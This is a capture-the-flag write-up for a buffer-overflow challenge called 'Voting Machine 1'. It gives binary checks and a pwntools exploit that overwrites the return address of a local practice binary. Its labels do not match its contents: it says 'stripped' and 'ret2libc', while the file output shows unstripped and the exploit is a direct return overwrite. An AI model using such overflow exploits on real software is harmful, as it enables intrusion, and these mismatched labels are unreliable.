# Voting Machine 1

file: `#x86_64` `#stripped`  
vuln: `#bof`  
soln: `#ret2libc`  
  
* File
```sh
$ file kamikaze 
kamikaze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=0e647f48bd36f15e866166910d10dd173fb0fcf6, not stripped
```
  
* checksec.sh
```sh
$ checksec.sh --file kamikaze 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   kamikaze

```
  
* exploit
```python
from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./kamikaze"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 10
payload += p64(0x400807)

p.recvuntil("Vote: ")
p.sendline(payload)

p.recvuntil("Thanks for voting!\n")
print(p.recvline())

#p.interactive()

```
